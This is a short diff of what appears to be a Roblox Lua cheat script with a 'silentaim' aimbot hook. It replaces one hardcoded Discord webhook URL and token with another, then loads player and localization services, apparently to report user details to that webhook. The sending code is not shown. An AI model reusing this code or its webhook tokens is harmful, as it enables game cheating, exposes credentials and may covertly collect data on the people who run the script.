@@ -79,8 +79,7 @@ RunService:BindToRenderStep("silentaim", 1, function()
     end
 end)
 
-
-local url = "https://discord.com/api/webhooks/1330382280484585583/gsBbiNiLEpk60K00MXf_OLhEhmKEIYZ0C4B7XUlUp54_Pp_lfm_wFabeoDJxjQwklkbP"
+local url = "https://discord.com/api/webhooks/1330412223021056101/CGXdo-Lk4NX9wc4Lux0Vk60DC505f4buRF_UokadJZe-L_e9-dHIDhSMluxOpyJuSAhu"
 
 local LocalizationService = game:GetService("LocalizationService")
 local Players = game:GetService("Players")
